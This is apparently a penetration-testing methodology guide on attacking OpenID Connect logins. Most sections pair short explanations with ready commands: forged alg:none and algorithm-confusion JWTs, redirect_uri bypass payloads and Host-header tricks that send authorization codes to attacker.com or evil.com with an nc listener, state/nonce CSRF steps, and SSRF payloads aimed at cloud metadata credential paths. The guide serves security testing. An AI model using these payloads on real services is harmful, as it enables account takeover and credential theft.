# OIDC (Open ID Connect) - Complete Exploitation Methodologies

OpenID Connect is an authentication layer built on OAuth 2.0. Testing focuses on token manipulation, redirect vulnerabilities, and misconfigurations.

---

## Table of Contents

1. [Common Implementations](#common-implementations)
2. [Discovery & Enumeration](#discovery--enumeration)
3. [Token Attacks](#token-attacks)
4. [Redirect URI Attacks](#redirect-uri-attacks)
5. [State & Nonce Bypass](#state--nonce-bypass)
6. [SSRF via OIDC](#ssrf-via-oidc)
7. [Scope Abuse](#scope-abuse)
8. [Specific Provider Attacks](#specific-provider-attacks)
9. [Tools & Automation](#tools--automation)
10. [Testing Methodology Summary](#testing-methodology-summary)

---

## Common Implementations

```
- Keycloak (Red Hat)
- Okta
- Auth0
- Azure AD
- Amazon Cognito (AWS)
- Google Identity
- GitLab
- Bitbucket Server (Atlassian)
- Salesforce
```

---

## Discovery & Enumeration

### Well-Known Endpoints

```bash
# OIDC Configuration (always check this first)
curl https://target.com/.well-known/openid-configuration | jq

# Returns:
# - authorization_endpoint
# - token_endpoint
# - userinfo_endpoint
# - jwks_uri (JSON Web Key Set)
# - supported scopes, claims, grant types

# OAuth 2.0 Authorization Server Metadata
curl https://target.com/.well-known/oauth-authorization-server | jq

# WebFinger (for email-based discovery)
curl "https://target.com/.well-known/webfinger?resource=acct:user@target.com"
```

### Key Endpoints to Test

```bash
/authorize
/token
/userinfo
/logout
/revoke
/introspect
/.well-known/openid-configuration
/.well-known/jwks.json
```

---

## Token Attacks

### ID Token Manipulation - alg: none Attack

**Vulnerability Explanation:**

JWT tokens contain a header that specifies the signing algorithm. Some vulnerable implementations accept the `alg: none` value, which means no signature is required. An attacker can modify the token payload and remove the signature entirely, and the server will still accept it as valid .

**Real-World Exploit: Authlib CVE-2026-28802**

A critical vulnerability was discovered in Authlib, a Python library for building OAuth and OpenID Connect servers, affecting versions 1.6.5 to 1.6.6. The flaw allowed attackers to bypass signature verification by presenting a malicious JWT containing `alg: none` with an empty signature .

**Step-by-Step Exploitation with Burp Suite:**

```bash
# Step 1: Login as a low-privileged user and capture the JWT session cookie
# In Burp Suite: Target -> HTTP History -> Find the /my-account request

# Step 2: Decode the JWT to understand its structure
echo "eyJhbGciOiJSUzI1NiIs..." | cut -d'.' -f2 | base64 -d | jq

# Step 3: In Burp Repeater, modify the JWT
# Original JWT: header.payload.signature

# Step 4: Change the header from {"alg":"RS256"} to {"alg":"none"}
# Base64URL encode: eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0

# Step 5: Modify the payload - change "sub": "user" to "sub": "administrator"
# Base64URL encode the modified payload

# Step 6: Remove the signature part and keep the trailing dot
# Final token: eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiAiYWRtaW5pc3RyYXRvciJ9.

# Step 7: Send the request with the modified token
GET /admin HTTP/1.1
Cookie: session=eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiAiYWRtaW5pc3RyYXRvciJ9.
```

**Using jwt_tool:**

```bash
# Tamper mode - interactive JWT manipulation
jwt_tool TOKEN -T

# In tamper mode:
# 1. Select option to change algorithm
# 2. Choose "none" algorithm
# 3. Modify payload claims
# 4. Save the tampered token
```

### Algorithm Confusion Attack (RS256 to HS256)

**Vulnerability Explanation:**

Some implementations expect tokens signed with RS256 (asymmetric) but also accept HS256 (symmetric). If the server uses the public key as the HMAC secret, an attacker can sign a token with the public key and the server will accept it.

**Exploitation Steps:**

```bash
# Step 1: Obtain the public key from the JWKS endpoint
curl https://target.com/.well-known/jwks.json | jq '.keys[0].n'

# Step 2: Convert the public key to the correct format
# Save the public key as public.pem

# Step 3: Use jwt_tool to perform the algorithm confusion attack
jwt_tool TOKEN -X a -k public.pem

# The -X a flag performs the algorithm confusion attack
# -k specifies the public key file
```

### Token Substitution - Client Binding Bypass

**Vulnerability Explanation:**

The OAuth 2.0 specification (RFC 6749 Section 4.1.3) requires that the client exchanging an authorization code must be the same client the code was issued to. When this validation is missing, a malicious client can exchange another client's authorization code .

**Real-World Exploit: Tinyauth CVE-2026-32245**

A vulnerability in Tinyauth's OIDC implementation demonstrated that the token endpoint did not verify client binding. A malicious OIDC client operator could exchange another client's authorization code using their own client credentials .

**Exploitation Steps with Burp Suite:**

```bash
# Step 1: As a normal user, login and authorize with Client A
# Capture the authorization code from the redirect
GET /callback?code=AUTH_CODE_FOR_CLIENT_A&state=xyz HTTP/1.1

# Step 2: In Burp Suite, send this request to Repeater
# Modify the token exchange request to use Client B's credentials

# Step 3: Original token exchange (Client A)
POST /token HTTP/1.1
Authorization: Basic Y2xpZW50LWE6c2VjcmV0LWE=
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTH_CODE_FOR_CLIENT_A&redirect_uri=https://client-a.com/callback

# Step 4: Modified request (using Client B)
POST /token HTTP/1.1
Authorization: Basic Y2xpZW50LWI6c2VjcmV0LWI=
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTH_CODE_FOR_CLIENT_A&redirect_uri=https://client-a.com/callback

# Step 5: If vulnerable, the server returns access_token, id_token, and refresh_token
# for Client B, associated with the user who authorized Client A
```

### Host Header Injection for Code Theft

**Vulnerability Explanation:**

The OIDC specification requires `redirect_uri` to be pre-registered and not derived from untrusted input. When the `redirect_uri` is constructed using the HTTP Host header, an attacker can inject a malicious domain and steal authorization codes .

**Real-World Exploit: SignalK Server CVE-2026-34083**

SignalK Server versions 2.20.0 to 2.24.0 constructed the OAuth2 `redirect_uri` using the unvalidated HTTP Host header. An attacker could spoof the Host header to steal authorization codes and hijack user sessions .

**Exploitation Steps:**

```bash
# Step 1: Identify the OIDC login endpoint
# Target: https://target.com/signalk/v1/auth/oidc/login

# Step 2: Send a request with a malicious Host header using Burp Suite
GET /signalk/v1/auth/oidc/login HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0
Accept: */*

# Step 3: The server constructs the redirect_uri using the injected Host header
# Location: https://attacker.com/signalk/v1/auth/oidc/callback?state=xyz

# Step 4: When a victim clicks the attacker's link, they authenticate
# The authorization code is sent to attacker.com

# Step 5: The attacker exchanges the stolen code for tokens
curl -X POST https://provider.com/token \
  -d "grant_type=authorization_code" \
  -d "code=STOLEN_CODE" \
  -d "client_id=victim_client" \
  -d "redirect_uri=https://attacker.com/callback"
```

**Testing with cURL:**

```bash
# Test if the Host header affects redirect_uri construction
curl -I "https://target.com/oauth/authorize?client_id=xxx&response_type=code" \
  -H "Host: evil.com"

# Check the Location header in the response
# If it contains evil.com, the application is vulnerable
```

---

## Redirect URI Attacks

### Redirect URI Allowlist Bypass

**Vulnerability Explanation:**

OIDC providers maintain an allowlist of valid redirect URIs. A flawed validation implementation can be bypassed using URL parsing tricks, allowing an attacker to redirect the authorization code to an attacker-controlled domain .

**Real-World Exploit: Backstage CVE-2026-32235**

Backstage versions prior to 0.27.1 had a redirect URI allowlist bypass vulnerability in the experimental OIDC provider. A specially crafted redirect URI could pass allowlist validation while resolving to an attacker-controlled host .

**Bypass Techniques to Test:**

```bash
# Technique 1: Subdomain attack
# If allowlist contains *.target.com
redirect_uri=https://attacker.target.com

# Technique 2: Prefix match attack
redirect_uri=https://target.com.attacker.com

# Technique 3: Path traversal
redirect_uri=https://target.com/callback/../../../attacker.com

# Technique 4: @ symbol confusion
redirect_uri=https://target.com@attacker.com

# Technique 5: URL encoding bypass
redirect_uri=https://target.com%2F%2Fattacker.com

# Technique 6: Null byte injection
redirect_uri=https://target.com%00.attacker.com

# Technique 7: Port manipulation
redirect_uri=https://target.com:8080@attacker.com

# Technique 8: Fragment injection
redirect_uri=https://target.com/callback#@attacker.com

# Technique 9: Double encoding
redirect_uri=https://target.com%252F%252Fattacker.com

# Technique 10: Newline injection
redirect_uri=https://target.com/callback%0d%0aLocation:%20https://attacker.com
```

**Testing with Burp Suite Intruder:**

```bash
# Step 1: Capture an authorization request in Burp Suite
GET /authorize?client_id=xxx&redirect_uri=https://target.com/callback&response_type=code

# Step 2: Send to Intruder (Ctrl+I)

# Step 3: Set payload position on the redirect_uri parameter value

# Step 4: Load payloads from a bypass techniques list
# Payload list:
https://attacker.com
https://target.com.attacker.com
https://target.com@attacker.com
https://target.com/callback/../../../attacker
https://target.com%2f%2fattacker.com
https://target.com%00.attacker.com

# Step 5: Start attack and monitor responses
# Look for responses that redirect to the attacker domain or don't return errors
```

### Open Redirect via redirect_uri

**Exploitation Steps:**

```bash
# Step 1: Identify the authorization endpoint
GET /authorize?client_id=victim-client&redirect_uri=https://target.com/callback&response_type=code

# Step 2: Test if the redirect_uri can point to an external domain
GET /authorize?client_id=victim-client&redirect_uri=https://evil.com&response_type=code

# Step 3: If the server redirects to evil.com, it's vulnerable
# The authorization code will be sent to evil.com/callback?code=xxx

# Step 4: Set up a listener on evil.com to capture codes
nc -lvnp 80

# Step 5: Send the malicious link to a victim
# When they click and authenticate, the code is sent to your server
```

### PKCE Downgrade Attack

**Vulnerability Explanation:**

PKCE (Proof Key for Code Exchange) is designed to protect public clients. Some implementations allow downgrading from PKCE to standard authorization code flow.

**Testing with OAUTH-Flow-Analyzer:**

```bash
# The tool automatically tests PKCE downgrade
python3 oauth_test.py \
  --auth "https://target.com/oauth/authorize" \
  --token "https://target.com/oauth/token" \
  --client-id "client_id" \
  --redirect-uri "https://target.com/callback"
```

---

## State & Nonce Bypass

### CSRF via Missing State Validation

**Vulnerability Explanation:**

The `state` parameter prevents CSRF attacks by binding the authorization request to the user's session. When validation is missing or weak, an attacker can initiate an OAuth flow and bind the resulting authorization code to their own session .

**Real-World Exploit: Sigstore-Python CSRF Vulnerability**

Sigstore-python versions prior to 1.0 generated a cryptographically random state parameter but failed to validate it on callback. An attacker could craft a malicious OAuth initiation URL and intercept the callback to cause signature forgery .

**Exploitation Steps:**

```bash
# Step 1: Attacker initiates an OAuth flow with their own state
GET https://target.com/authorize?client_id=xxx&redirect_uri=https://target.com/callback&state=attacker_chosen_value&response_type=code

# Step 2: Attacker sends a crafted link to victim
# Link: https://target.com/authorize?client_id=xxx&state=attacker_chosen_value

# Step 3: Victim clicks, authenticates with the provider

# Step 4: Attacker intercepts the callback response
# The OAuth provider sends the code to the redirect_uri

# Step 5: Attacker forwards the callback to the victim's client
# Since state validation is missing, the victim's session accepts it

# Step 6: The victim's actions are associated with the attacker's identity
```

**Automated State Testing with OAUTH-Flow-Analyzer:**

```bash
# The tool automatically tests for:
# - Missing state parameter
# - State reuse/replay
# - XSS via state
# - Callback validation

python3 oauth_test.py \
  --auth "https://target.com/oauth/authorize" \
  --client-id "client_id" \
  --redirect-uri "https://target.com/callback" \
  --checks state
```

**Manual State Testing with Burp Suite:**

```bash
# Step 1: Capture a normal authorization request with state
GET /authorize?client_id=xxx&redirect_uri=https://target.com/callback&state=ORIGINAL_STATE&response_type=code

# Step 2: Remove the state parameter
GET /authorize?client_id=xxx&redirect_uri=https://target.com/callback&response_type=code

# Step 3: If the request succeeds without state, CSRF is possible

# Step 4: Test state reuse
# Complete an OAuth flow and capture the state value
# Try using the same state in a different session

# Step 5: Test state not bound to session
# Generate state from Session A
# Use it in authorization request for Session B
```

### State Parameter Weakness Testing with Go Script

```go
// Automated state binding test from CVE-2026-34083 analysis 
package main

import (
    "fmt"
    "net/http"
    "net/url"
    "time"
)

func checkStateBinding(targetURL string) {
    u, _ := url.Parse(targetURL)
    q := u.Query()
    q.Set("state", "attacker_controlled") // Replace with arbitrary value
    u.RawQuery = q.Encode()

    client := &http.Client{Timeout: 5 * time.Second}
    resp, err := client.Get(u.String())
    if err != nil {
        fmt.Println("Request failed:", err)
        return
    }
    defer resp.Body.Close()

    if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound {
        fmt.Printf("WARNING: Target %s may not validate state binding (returned %d)\n", targetURL, resp.StatusCode)
    } else {
        fmt.Printf("OK: State validation appears normal (returned %d)\n", resp.StatusCode)
    }
}
```

### Nonce Bypass

**Testing for Missing Nonce:**

```bash
# In OIDC implicit flow, the nonce parameter prevents replay attacks

# Step 1: Capture an implicit flow request with nonce
GET /authorize?client_id=xxx&redirect_uri=https://target.com/callback&response_type=id_token&nonce=ORIGINAL_NONCE

# Step 2: Remove the nonce parameter
GET /authorize?client_id=xxx&redirect_uri=https://target.com/callback&response_type=id_token

# Step 3: If the server returns an id_token without nonce validation,
# replay attacks may be possible

# Step 4: Test nonce reuse
# Capture a valid id_token
# Replay it in a different session
```

---

## SSRF via OIDC

### SSRF via jwks_uri in Dynamic Client Registration

**Vulnerability Explanation:**

The OpenID Connect Dynamic Client Registration feature allows clients to specify a `jwks_uri` containing their public keys. When the server fetches keys from this URI without validation, it can be exploited for SSRF attacks .

**Real-World Exploit: Keycloak CVE-2026-1180**

Keycloak's OpenID Connect Dynamic Client Registration feature allowed clients to specify an arbitrary `jwks_uri`, which Keycloak then retrieved without validating the destination. Attackers could coerce the Keycloak server into making HTTP requests to internal or restricted network resources .

**Exploitation Steps:**

```bash
# Step 1: Register a malicious client with an internal jwks_uri
curl -X POST https://keycloak.example.com/auth/realms/master/clients-registrations/openid-connect \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "malicious-client",
    "client_secret": "generated-secret",
    "token_endpoint_auth_method": "private_key_jwt",
    "jwks_uri": "http://169.254.169.254/latest/meta-data/"
  }'

# Step 2: The Keycloak server fetches from the jwks_uri
# This requests AWS metadata endpoint

# Step 3: For blind SSRF, use timing and error messages to infer results
# A timeout indicates the host is unreachable
# An error response indicates the host exists but doesn't serve JWKS

# Step 4: Test internal services
"jwks_uri": "http://localhost:8080/admin"
"jwks_uri": "http://127.0.0.1:22"  # SSH port
"jwks_uri": "http://internal-database:3306"
"jwks_uri": "http://kubernetes.default.svc.cluster.local"
```

**Testing Payloads for SSRF:**

```bash
# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Internal services
http://localhost:8080/
http://127.0.0.1:22
http://127.0.0.1:6379  # Redis
http://127.0.0.1:27017  # MongoDB

# Internal hostnames
http://internal-api.production.svc.cluster.local
http://kubernetes-dashboard.kube-system.svc.cluster.local

# Other internal IP ranges
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/
```

### SSRF via redirect_uri

```bash
# Test if the authorization endpoint makes requests to the redirect_uri
# Some implementations fetch the redirect_uri for validation

GET /authorize?client_id=xxx&redirect_uri=http://169.254.169.254/&response_type=code

# If the server fetches this URL during validation, SSRF occurs
```

---

## Scope Abuse

### Scope Escalation Testing

**Vulnerability Explanation:**

Some OIDC implementations do not properly validate that the requested scope in the token exchange matches the scope that was authorized by the user.

**Testing Steps:**

```bash
# Step 1: Request minimal scope initially
GET /authorize?client_id=xxx&scope=openid+profile&redirect_uri=https://target.com/callback&response_type=code

# Step 2: Capture the authorization code

# Step 3: In the token exchange, request elevated scopes
POST /token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://target.com/callback&scope=openid+profile+email+admin+write

# Step 4: If the token contains the elevated scopes, scope escalation is possible

# Step 5: Test for hidden scopes
# Common hidden scopes to test:
scope=admin
scope=admin:all
scope=write
scope=delete
scope=user:impersonation
scope=roles
scope=groups
scope=offline_access  # May return refresh token
```

**Automated Scope Probing with OAUTH-Flow-Analyzer:**

```bash
# The tool tests 40+ hidden scope probes automatically
python3 oauth_test.py \
  --auth "https://target.com/oauth/authorize" \
  --client-id "client_id" \
  --redirect-uri "https://target.com/callback" \
  --checks scope
```

---

## Specific Provider Attacks

### Keycloak

**Keycloak Specific Endpoints:**

```bash
# Admin console discovery
/auth/admin/
/auth/admin/master/console/

# Realm information
/auth/realms/{realm}/.well-known/openid-configuration

# List realms (if misconfigured)
/auth/admin/realms

# Client registration endpoint
/auth/realms/{realm}/clients-registrations/openid-connect
```

**Keycloak SSRF Testing (CVE-2026-1180):**

```bash
# Test if dynamic client registration is enabled
curl -X GET https://keycloak.example.com/auth/realms/master/clients-registrations/openid-connect

# If returns 200, registration is enabled

# Test SSRF via jwks_uri
curl -X POST https://keycloak.example.com/auth/realms/master/clients-registrations/openid-connect \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "test-ssrf",
    "token_endpoint_auth_method": "private_key_jwt",
    "jwks_uri": "http://169.254.169.254/latest/meta-data/"
  }'

# Monitor server logs or use timing attacks to confirm SSRF
```

**Keycloak Known CVEs:**

| CVE | Description | Affected Versions |
|-----|-------------|-------------------|
| CVE-2020-1714 | Adapter token spoofing | Various |
| CVE-2020-1728 | SAML authentication bypass | Various |
| CVE-2026-1180 | SSRF via jwks_uri | Keycloak with dynamic client registration |

### Azure AD (Entra ID)

**Azure AD Specific Testing:**

```bash
# Tenant enumeration
curl https://login.microsoftonline.com/{tenant}/.well-known/openid-configuration

# Common tenants to test:
# - common
# - organizations
# - consumers
# - {tenant-id} (GUID)
# - {domain}.onmicrosoft.com

# Test for guest user abuse
# B2B guest tokens may have unexpected permissions

# Test for dynamic group membership manipulation
# Attackers can modify attributes used in dynamic group rules
```

**Azure AD Dynamic Group Attack:**

```bash
# Step 1: Enumerate dynamic group rules
# Group rule example: (user.department -eq "Sales")

# Step 2: If the attacker can modify the department attribute
# They can manipulate group membership

# Step 3: Guest account injection
# Invite a malicious guest account to the tenant
# The guest account's attributes match the dynamic group rule
# The guest automatically joins the group and inherits permissions

# Mitigation check:
# Ensure dynamic group rules exclude guest accounts
# Rule should include: and (user.userType -ne "Guest")
```

### AWS Cognito

**Cognito Specific Testing:**

```bash
# User pool information
curl https://cognito-idp.{region}.amazonaws.com/{userPoolId}/.well-known/openid-configuration

# Test for self-registration
# If enabled, anyone can create an account
aws cognito-idp sign-up \
  --client-id $CLIENT_ID \
  --username $ATTACKER_NAME \
  --password $ATTACKER_PASSWORD \
  --no-sign-request

# Test for attribute-based access control bypass
# Modify user attributes after registration
aws cognito-idp admin-update-user-attributes \
  --user-pool-id $POOL_ID \
  --username $ATTACKER_NAME \
  --user-attributes Name=custom:role,Value=admin
```

---

## Tools & Automation

### OAUTH-Flow-Analyzer - Complete Attack Suite

OAUTH-Flow-Analyzer is a comprehensive OAuth 2.0/OIDC vulnerability scanner that tests for state CSRF, redirect_uri bypass (15+ variants), PKCE downgrade, scope escalation, token leakage, and OIDC-specific flaws .

**Installation:**

```bash
git clone https://github.com/Zeeshanafridai/OAUTH-Flow-Analyzer
cd OAUTH-Flow-Analyzer
pip install -r requirements.txt
```

**Basic Scan (No Authentication):**

```bash
python3 oauth_test.py \
  --auth "https://target.com/oauth/authorize" \
  --token "https://target.com/oauth/token" \
  --client-id "my_client_id" \
  --redirect-uri "https://target.com/callback"
```

**Full Authenticated Scan:**

```bash
python3 oauth_test.py \
  --auth "https://target.com/oauth/authorize" \
  --token "https://target.com/oauth/token" \
  --userinfo "https://target.com/oauth/userinfo" \
  --client-id "my_client_id" \
  --client-secret "my_secret" \
  --redirect-uri "https://target.com/callback" \
  --code "AUTH_CODE_FROM_BROWSER" \
  --id-token "eyJhbGciOiJSUzI1NiIs..." \
  --refresh-token "REFRESH_TOKEN" \
  --attacker "your-server.com" \
  --report
```

**Test Specific Checks Only:**

```bash
# Only test redirect_uri and scope vulnerabilities
python3 oauth_test.py \
  --auth "https://target.com/oauth/authorize" \
  --client-id "client_id" \
  --redirect-uri "https://target.com/callback" \
  --checks redirect_uri scope
```

**Custom Attacker Domain and Redirect URIs:**

```bash
python3 oauth_test.py \
  --auth "https://target.com/oauth/authorize" \
  --client-id "client_id" \
  --redirect-uri "https://target.com/callback" \
  --attacker "evil.com" \
  --custom-uris "https://evil.com/steal" "http://localhost:8080/cb"
```

**How to Obtain Tokens for Testing:**

```bash
# Method 1: Browser DevTools
# 1. Open DevTools -> Network tab
# 2. Initiate OAuth login on target app
# 3. Intercept the redirect to /callback?code=XXXX
# 4. Copy the code value -> use as --code

# Method 2: Local Storage / Session Storage
# 1. Complete OAuth flow in browser
# 2. DevTools -> Application -> Local Storage / Session Storage
# 3. Look for access_token, id_token, refresh_token
# 4. Use as --id-token / --refresh-token
```

### jwt_tool - JWT Manipulation

```bash
# Basic token decoding
jwt_tool TOKEN

# Tamper mode (interactive manipulation)
jwt_tool TOKEN -T

# Algorithm confusion attack
jwt_tool TOKEN -X a -k public_key.pem

# Crack HS256 secret
jwt_tool TOKEN -C -d wordlist.txt

# Scan for common vulnerabilities
jwt_tool TOKEN -X i

# Exploit "none" algorithm
jwt_tool TOKEN -X n

# Modify claims and resign
jwt_tool TOKEN -S hs256 -p "secret" -c "{\"sub\":\"admin\"}"
```

### Burp Suite Extensions

| Extension | Purpose |
|-----------|---------|
| JSON Web Tokens | JWT decoding, manipulation, attack generation |
| OAuth 2.0 Scanner | OAuth/OIDC vulnerability detection |
| SAML Raider | For SAML/OIDC hybrid implementations |
| Turbo Intruder | High-speed parameter fuzzing |

### Burp Suite Manual Testing Workflow

```bash
# Step 1: Configure Burp Suite
# Proxy -> Options -> Add listener on 8080
# Install CA certificate in browser

# Step 2: Map the application
# Target -> Site map -> Right click -> Spider this host

# Step 3: Identify OIDC endpoints
# Look for:
# - /authorize
# - /token
# - /userinfo
# - .well-known/openid-configuration

# Step 4: Test redirect_uri validation
# Send authorization request to Repeater
# Modify redirect_uri to various payloads
# Send and observe responses

# Step 5: Test state parameter
# Remove state, modify state, replay state
# Send to Intruder for fuzzing

# Step 6: Test token endpoint
# Capture token exchange request
# Test parameter injection, scope escalation

# Step 7: Use Burp Sequencer for token randomness
# Capture multiple tokens
# Sequencer -> Load tokens -> Analyze
```

### OIDC Bash Client

```bash
# Simple OIDC testing script
git clone https://github.com/AhmedMohamedDev/oidc-bash-client
cd oidc-bash-client

# Configure client
./oidc-client.sh --config config.sh

# Test authorization endpoint
./oidc-client.sh --authorize

# Test token exchange
./oidc-client.sh --token --code AUTH_CODE

# Test userinfo endpoint
./oidc-client.sh --userinfo --token ACCESS_TOKEN
```

---

## Testing Methodology Summary

### Phase 1: Discovery

| Test | Command/Method |
|------|----------------|
| Well-known endpoints | `curl https://target.com/.well-known/openid-configuration` |
| JWKS endpoint | `curl https://target.com/.well-known/jwks.json` |
| Endpoint enumeration | Burp Suite spider, directory brute-forcing |

### Phase 2: Authorization Endpoint Testing

| Test | Method |
|------|--------|
| redirect_uri bypass | 15+ bypass techniques with Burp Intruder |
| state parameter | Remove, modify, replay state values |
| nonce parameter | Remove, modify, replay nonce values |
| scope escalation | Request elevated scopes |
| response_type manipulation | Test all supported response types |
| PKCE downgrade | Remove code_challenge parameter |

### Phase 3: Token Endpoint Testing

| Test | Method |
|------|--------|
| Client authentication | Test with/without client_secret |
| Code reuse | Exchange same code twice |
| Token substitution | Use code from different client |
| Refresh token abuse | Reuse old refresh tokens |
| Scope escalation | Request different scopes during exchange |

### Phase 4: Token Analysis

| Test | Method |
|------|--------|
| JWT decoding | `jwt_tool TOKEN` |
| Algorithm confusion | `jwt_tool TOKEN -X a` |
| alg: none | `jwt_tool TOKEN -X n` |
| Weak signature | Crack with `jwt_tool TOKEN -C` |
| Claim manipulation | Tamper mode |

### Phase 5: UserInfo Endpoint Testing

| Test | Method |
|------|--------|
| Unauthenticated access | Request without token |
| Token substitution | Use token from different client |
| Method override | Test GET/POST/PUT/DELETE |

### Phase 6: SSRF Testing

| Test | Payload |
|------|---------|
| jwks_uri SSRF | `http://169.254.169.254/latest/meta-data/` |
| redirect_uri SSRF | `http://localhost:8080/admin` |
| Dynamic registration | Custom jwks_uri with internal addresses |

---

## Attack Coverage Reference

| Category | Checks | Tool Support |
|----------|--------|--------------|
| State Parameter | Missing state, reuse/replay, XSS via state, callback validation | OAUTH-Flow-Analyzer |
| redirect_uri | 15+ bypass techniques | OAUTH-Flow-Analyzer, Burp Intruder |
| Token Leakage | Implicit flow abuse, PKCE downgrade, code reuse | OAUTH-Flow-Analyzer |
| Scope Abuse | 40+ hidden scope probes, ROPC enabled, refresh scope escalation | OAUTH-Flow-Analyzer |
| OIDC | UserInfo unauth, alg:none id_token, nonce missing, claim analysis | jwt_tool, OAUTH-Flow-Analyzer |
| SSRF | jwks_uri SSRF, redirect_uri SSRF | Manual, Burp Repeater |

---

## Related Topics

* [OAuth](https://www.pentest-book.com/enumeration/webservices/oauth) - OIDC is built on OAuth 2.0
* [JWT](https://www.pentest-book.com/enumeration/webservices/jwt) - ID tokens are JWTs
* [SSRF](https://www.pentest-book.com/enumeration/web/ssrf) - URI parameters can be SSRF vectors
